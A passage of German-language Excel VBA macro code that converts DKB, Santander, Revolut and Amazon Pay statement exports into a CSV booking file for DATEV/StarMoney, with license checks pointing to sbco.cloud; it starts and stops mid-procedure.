                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 12) = vwz
                If Left(vwz, 1) = "-" Or Left(vwz, 1) = "+" Then vwz = " " & vwz
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 18) = transaktionstyp
              Next zeile1
  
  
  Application.DisplayAlerts = False
  Sheets(DKBsheet).Select
  ActiveWindow.SelectedSheets.Delete
  Application.DisplayAlerts = True
  
  End If    ' DKB Behandlung zu Ende
  
  
  
  '################################  SANTANDER Bank ########################
  If bank = "Santander" Then
   If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
  
        
  ActiveWorkbook.Worksheets.Add
    With ActiveSheet.QueryTables.Add(Connection:= _
        "TEXT;" & fremdprogramm, Destination _
        :=Range("$A$1"))
        '.CommandType = 0
        .Name = "MdBlatt"
        .FieldNames = True
        .RowNumbers = False
        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .RefreshStyle = xlInsertDeleteCells
        .SavePassword = False
        .SaveData = True
        .AdjustColumnWidth = True
        .RefreshPeriod = 0
        .TextFilePromptOnRefresh = False
        .TextFilePlatform = 1252
        .TextFileStartRow = 1
        .TextFileParseType = xlDelimited
        .TextFileTextQualifier = xlTextQualifierDoubleQuote
        .TextFileConsecutiveDelimiter = False
        .TextFileTabDelimiter = False
        .TextFileSemicolonDelimiter = True
        .TextFileCommaDelimiter = False
        .TextFileSpaceDelimiter = False
        .TextFileColumnDataTypes = Array(1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)
        .TextFileTrailingMinusNumbers = True
        .Refresh BackgroundQuery:=False
    End With

    
    santandersheet = ActiveSheet.Name
       
'spalten zusammenziehen
    x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
For xZeile = 2 To x

If Cells(xZeile, 4) = "|fffd|berw." Then
    Cells(xZeile, 4).Select
    Selection.Delete Shift:=xlToLeft
End If
For spalte = 8 To 150
  Text = Text & Cells(xZeile, spalte) & " "

Next spalte
Text = Replace(Text, "        ", " ")
Text = Replace(Text, "       ", " ")
Text = Replace(Text, "      ", " ")
Text = Replace(Text, "     ", " ")
Text = Replace(Text, "    ", " ")
Text = Replace(Text, "   ", " ")
Text = Replace(Text, "  ", " ")
Text = Replace(Text, "  ", " ")
Text = Replace(Text, "SEPA-LASTSCHRIFT VON", " ")
Text = Replace(Text, "|fffd|BERWEISUNG VON ", " ")
Text = Replace(Text, "|fffd|BERWEISUNG AN ", " ")
Text = Replace(Text, "  ", " ")
ibanstelle = InStr(Text, "IBAN")
bicstelle = InStr(Text, "BIC")
empfaenger = Left(Text, ibanstelle)
'Cells(40, 1) = Text
vwz = Right(Text, Len(Text) - WorksheetFunction.Min(37, Len(empfaenger)) - Len(empfaenger))
If ibanstelle <> 0 Then iban = Mid(Text, ibanstelle + 5, 22)
Cells(xZeile, 151) = iban

'Cells(40, 1) = Text
If bicstelle <> 0 Then bic = Mid(Text, bicstelle + 5, 11)
Cells(xZeile, 152) = bic
Cells(xZeile, 8) = empfaenger
Cells(xZeile, 9) = vwz
Text = ""
ibanstelle = 0
bicstelle = 0
iban = ""
bic = ""
Next xZeile
       
        'schleife Daten lesen
        x = ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row
            
            For zeile1 = 2 To x
                datum = Cells(zeile1, 1)
                empfaenger = Cells(zeile1, 8)
                iban = Cells(zeile1, 151)
                bic = Cells(zeile1, 152)
                vwz = Cells(zeile1, 9)
                          svwzstelle = InStr(vwz, "SVWZ")
                          If svwzstelle <> 0 Then vwz = Right(vwz, Len(vwz) - svwzstelle - 4)
                betrag = Cells(zeile1, 4)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
    
                   If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                      'empf|fffd|nger bereinigen, abschneiden, wenn rechts nur noch Zahlen kommen
                      For stelle = 1 To Len(empfaenger)
                        If IsNumeric(Mid(empfaenger, stelle, 10)) = True Then empfaenger = Left(empfaenger, stelle): Exit For
                      Next stelle
                      
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger

                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 10) = bic
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = iban
                       If Left(vwz, 1) = "-" Or Left(vwz, 1) = "+" Then vwz = " " & vwz
                       Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = Left(vwz, 27)
                       If Len(vwz) > 27 Then Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = Mid(vwz, 28, 27)
                       If Len(vwz) > 54 Then Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = Mid(vwz, 55, 27)
                  
                   
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                   Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                   svwzstelle = 0
               Next zeile1
  
    Application.DisplayAlerts = False
    Sheets(santandersheet).Select
    ActiveWindow.SelectedSheets.Delete
    Application.DisplayAlerts = True
    'EUR Zeichen entfernen und Leerzeichen entfernen
    Columns("G:G").Select
    Selection.Replace What:=" EUR", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
End If    'SANTANDER  Behandlung zu Ende
  
  
  
   If bank = "Santander 2" Then
   If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
  
        
  Workbooks.Open Filename:=fremdprogramm, Local:=True
    Columns("D:D").Select
    Selection.Replace What:=" EUR", Replacement:="", LookAt:=xlPart, _
    SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
    ReplaceFormat:=False

    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
     x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 2 To x
                datum = Cells(zeile1, 1)
                betrag = Cells(zeile1, 4)          '
                IbanAuftraggeber = Cells(zeile1, 9)
                transaktionstyp = Cells(zeile1, 3)
                
                vwz1 = Cells(zeile1, 8)
                vwz2 = Cells(zeile1, 9)
                vwz3 = Cells(zeile1, 10)
                vwz4 = Cells(zeile1, 11)
                vwz5 = Cells(zeile1, 12)
                vwz6 = Cells(zeile1, 13)
                vwz7 = Cells(zeile1, 14)
                vwz9 = Cells(zeile1, 15)
                vwz10 = Cells(zeile1, 16)
                      
                empfaenger1 = Cells(zeile1, 6)
                empfaenger2 = Cells(zeile1, 7)
                empfaenger1 = Replace(empfaenger1, "|fffd|BERWEISUNG VON", "")
                empfaenger1 = Replace(empfaenger1, "|fffd|BERWEISUNG AN", "")
                empfaenger1 = Replace(empfaenger1, "SEPA-LASTSCHRIFT VON", "")

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
  Workbooks(macrodatei).Activate
    
  
End If    'SANTANDER 2  Behandlung zu Ende
  
  
  '########### Schreiben
  
  
x = ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row


Dateischreiben:
Workbooks(macrodatei).Activate
    Columns("F:F").Select
    Selection.NumberFormat = "m/d/yyyy"
    Cells.Select
    ActiveWorkbook.Worksheets("Tabelle").Sort.SortFields.Clear
    ActiveWorkbook.Worksheets("Tabelle").Sort.SortFields.Add Key:=Range("F1:F10000" _
        ), SortOn:=xlSortOnValues, Order:=xlAscending, DataOption:= _
        xlSortTextAsNumbers
    With ActiveWorkbook.Worksheets("Tabelle").Sort
        .SetRange Range("A1:ZZ10000")
        .Header = xlGuess
        .MatchCase = False
        .Orientation = xlTopToBottom
        .SortMethod = xlPinYin
        .Apply
    End With

Set Bereich = ActiveSheet.Range("A1:DZ" & x)   '-1 gel|fffd|scht
'Set Bereich = ActiveSheet.Range("A1:DZ" & x - 1)   '-1 gel|fffd|scht

 
filesavename = mandantenname & "  " & bank & ".csv"

    Open filesavename For Output As #1

   Workbooks(macrodatei).Activate
   Sheets("Tabelle").Activate
Application.DisplayAlerts = False
   Cells.Replace What:=";", Replacement:=" ", LookAt:=xlPart, SearchOrder _
        :=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False
Application.DisplayAlerts = True


For zeilen = 1 To x
'For zeilen = 1 To x - 1  ' minus 1 gel|fffd|scht 29.5.2019
    For spalte = 1 To 24  '24 spalten m|fffd|ssen da sein.
       
       If spalte = 5 Or spalte = 6 Or spalte = 7 Then 'in bestimmten Spalten keine Anf|fffd|hrungsstriche
         strtemp1 = strtemp1 & Cells(zeilen, spalte) & ";"
                     
       Else  'mit semikolon vorn und hinten
         strtemp1 = strtemp1 & """" & Cells(zeilen, spalte) & """" & ";"
       End If
       If Val(Mid(strtemp1, 2, 3)) = 0 Then   'wenn keine Kontonummer vorhanden ist, Schleife verlassen
          GoTo ende2
       End If
    Next spalte
    
    Print #1, strtemp1
    strtemp1 = ""
   Next zeilen

ende2:
  Close #1
  
  
  Set Bereich = Nothing

ActiveWorkbook.Save

Application.DisplayAlerts = True
Sheets("1").Select
MsgBox ("Fertig exportiert f|fffd|r Datev. Hier ist die Starmoney-Datei: " & filesavename & " im gleichen Ordner wie die Quelldatei. Anzahl der Buchungss|fffd|tze: " & zeilen)
End If

endeL:
ende:
End
'Version = ""
End Sub





Attribute VB_Name = "Revolut_"


Sub revolut()

If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
   Workbooks.Open Filename:=fremdprogramm, Local:=True
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    ' Plus und Minus ersetzen
    Columns("b:b").Select
    Selection.Replace What:="+", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="-", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Cells.Replace What:="|a0|", Replacement:="", LookAt:=xlPart, SearchOrder _
        :=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False

     'text in Spalten:
         Columns("C:C").Select
    Selection.TextToColumns Destination:=Range("C1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=False, FieldInfo _
        :=Array(1, 1), TrailingMinusNumbers:=True
    Columns("D:D").Select
    Selection.TextToColumns Destination:=Range("D1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=False, FieldInfo _
        :=Array(1, 1), TrailingMinusNumbers:=True
    Columns("E:E").Select
    Selection.TextToColumns Destination:=Range("E1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=False, FieldInfo _
        :=Array(1, 1), TrailingMinusNumbers:=True
    Columns("F:F").Select
    Selection.TextToColumns Destination:=Range("F1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=False, FieldInfo _
        :=Array(1, 1), TrailingMinusNumbers:=True
    Columns("G:G").Select
    Selection.TextToColumns Destination:=Range("G1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, _
        Semicolon:=False, Comma:=False, Space:=False, Other:=False, FieldInfo _
        :=Array(1, 1), TrailingMinusNumbers:=True
    
    x = Workbooks(fremdprogrammDatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
        For zeile1 = 2 To x
                 datum = Cells(zeile1, 1)
                 
                 betrag = -Cells(zeile1, 3) + Cells(zeile1, 4)
                 
                'IbanAuftraggeber = Cells(zeile1, 6)
                'transaktionstyp = Cells(zeile1, 9)
                Text = Cells(zeile1, 2)
                                
                'vwz1 = Left(Text, 27)
                'vwz2 = Mid(Text, 28, 27)
                'vwz3 = Mid(Text, 54, 27)
                'vwz4 = Mid(Text, 81, 27)
                'vwz5 = Mid(Text, 108, 27)
                'vwz6 = Mid(Text, 135, 27)
                'vwz7 = Mid(Text, 162, 27)
                'vwz9 = Mid(Text, 189, 27)
                'vwz10 = Mid(Text, 216, 27)
                      
                
                empfaenger1 = Left(Cells(zeile1, 2), 27)
                empfaenger2 = Mid(Cells(zeile1, 2), 28, 27)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""

              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
 Workbooks(macrodatei).Activate

'####################################################################


End Sub


Attribute VB_Name = "Revolut_1"


Sub revolut1()

If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub


    
  '  Workbooks.Open Filename:=fremdprogramm, Origin:=xlWindows
    Sheets("temp").Activate

Sheets("temp").Select
   Columns("A:CK").Select
    Selection.ClearContents
    Cells.Select
    Selection.QueryTable.Delete
    Selection.ClearContents
    
    
    
name1 = Now()
    
     With ActiveSheet.QueryTables.Add(Connection:= _
        "TEXT;" & fremdprogramm _
        , Destination:=Range("$A$1"))
       ' .CommandType = 0
     '   .Name = "Revolut-EUR-Kontoauszug-1. Sept. 2019 an 30. Okt. 2019"
         .Name = name1
        .FieldNames = True
        .RowNumbers = False
        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .RefreshStyle = xlInsertDeleteCells
        .SavePassword = False
        .SaveData = True
        .AdjustColumnWidth = True
        .RefreshPeriod = 0
        .TextFilePromptOnRefresh = False
        .TextFilePlatform = 1252
        .TextFileStartRow = 1
        .TextFileParseType = xlDelimited
        .TextFileTextQualifier = xlTextQualifierDoubleQuote
        .TextFileConsecutiveDelimiter = False
        .TextFileTabDelimiter = True
        .TextFileSemicolonDelimiter = True
        .TextFileCommaDelimiter = False
        .TextFileSpaceDelimiter = False
        .TextFileColumnDataTypes = Array(1, 1, 1, 1, 1, 1, 1, 1)
        .TextFileTrailingMinusNumbers = True
        .Refresh BackgroundQuery:=False
    End With

    
    
    
    Jahr = InputBox("Welches Jahr buchst Du? 20 f|fffd|r 2020?", "Welches Jahr buchst Du?", "20")
    fidorsheet = ActiveSheet.Name
'    fremdprogrammDatei = ActiveWorkbook.Name
'    Workbooks(fremdprogrammDatei).Activate
    ' Plus und Minus ersetzen
    Columns("B:L").Select
    Selection.Replace What:="|fffd|", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Cells.Replace What:="|a0|", Replacement:="", LookAt:=xlPart, SearchOrder _
        :=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False

    x = Sheets("temp").UsedRange.SpecialCells(xlCellTypeLastCell).Row
        For zeile1 = 2 To x
    
                 Tag = Right(Cells(zeile1, 1), 2)
                  If Tag = "" Then
                  GoTo endeRevolut1
                  End If
                 monat = Mid(Cells(zeile1, 1), 4, 2)
                 datum = Tag & "." & monat & "." & Jahr
                   
                   
              
                  '  Datum = Format(CDate(Left(Datum, 6) & Jahr), "dd.mm.yy")
                   
                 betrag = Cells(zeile1, 3).Value - Cells(zeile1, 4).Value
                 
                'IbanAuftraggeber = Cells(zeile1, 21)
                'transaktionstyp = Cells(zeile1, 6)
                Text = Cells(zeile1, 2) & " " & Cells(zeile1, 4)
                                
                vwz1 = Left(Text, 27)
                vwz2 = Mid(Text, 54, 27)
                vwz3 = Mid(Text, 81, 27)
                vwz4 = Mid(Text, 108, 27)
                vwz5 = Mid(Text, 135, 27)
                vwz6 = Mid(Text, 162, 27)
                'vwz7 = Mid(Text, 162, 27)
                'vwz9 = Mid(Text, 189, 27)
                'vwz10 = Mid(Text, 216, 27)
                      
                
                empfaenger1 = Left(Cells(zeile1, 2), 27)
                empfaenger2 = Mid(Cells(zeile1, 2), 28, 27)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""

              Next zeile1
endeRevolut1:
Sheets("temp").Select
   Columns("A:CK").Select
    Selection.ClearContents
  
Sheets("Tabelle").Select
   
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Workbooks(macrodatei).Activate

'####################################################################


End Sub


Attribute VB_Name = "Tabelle1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Tabelle2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Tabelle3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Tabelle4"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "anleitung, 10, 1, MSForms, CommandButton"
Attribute VB_Control = "CommandButton1, 1, 2, MSForms, CommandButton"
Private Sub anleitung_Click()
Sheets("Anleitung Kanzlei - Rechnungswe").Activate
Sheets("Anleitung Kanzlei - Rechnungswe").Cells(1, 1).Select
End Sub

Private Sub CommandButton1_Click()
N26
End Sub

Private Sub CommandButton2_Click()
nur_Speichern
End Sub

Private Sub CommandButton3_Click()
buttonanpassen
End Sub
Attribute VB_Name = "Tabelle9"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "amazonPay_"
Sub AmazonPay()

Version = "AmazonPay111"
outputzeile = 2
If Version <> "AmazonPay" Then MsgBox ("Du hast keine AmazonPay-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
Application.ScreenUpdating = False
         'MdDatei = Application.GetOpenFilename("txt Files (*.*), *.*", , "stripe-Datei von Mandant |fffd|ffnen")
         Workbooks.OpenText Filename:= _
           fremdprogramm, Origin:=xlWindows, _
          StartRow:=1, DataType:=xlDelimited, TextQualifier:=xlDoubleQuote, _
          ConsecutiveDelimiter:=False, Tab:=True, Semicolon:=False, Comma:=True _
          , Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), Array(2, 1), _
          Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1), Array(8, 1), Array(9, 1), _
          Array(10, 1)), TrailingMinusNumbers:=True
  
          mandantendatei = ActiveWorkbook.Name
    
       letzteZeile = Workbooks(mandantendatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
       
  
   Rem Mandantendatei lesen
  For zeile1 = 2 To letzteZeile
      textzeile = 1
      leer = 0
      
       Application.StatusBar = "Bearbeite Zeile " & zeile1 & " von " & letzteZeile
       Workbooks(mandantendatei).Activate
       
       datum = Cells(zeile1, 1)
       datum = Left(datum, 10)
       datum = CDate(datum)
       betrag = Cells(zeile1, 11)
       gebuehr = Cells(zeile1, 14)
              
       verwendungszweck1 = Cells(zeile1, 2)
       verwendungszweck2 = Cells(zeile1, 4)
       verwendungszweck3 = Cells(zeile1, 3)
       verwendungszweck4 = Cells(zeile1, 6)
       verwendungszweck5 = Cells(zeile1, 7)
       'verwendungszweck6 = Left(Cells(zeile1, 21), 27)
       'verwendungszweck7 = Left(Cells(zeile1, 22), 27)
       'verwendungszweck8 = Left(Cells(zeile1, 23), 27)
       'verwendungszweck9 = Left(Cells(zeile1, 21), 27)
       'verwendungszweck10 = Left(Cells(zeile1, 21), 27)
       empfaenger = Cells(zeile1, 5)
       
                
             '   betrag = Cells(zeile1, 16) + Cells(zeile1, 17)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 7) = betrag
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 8) = empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 12) = verwendungszweck1
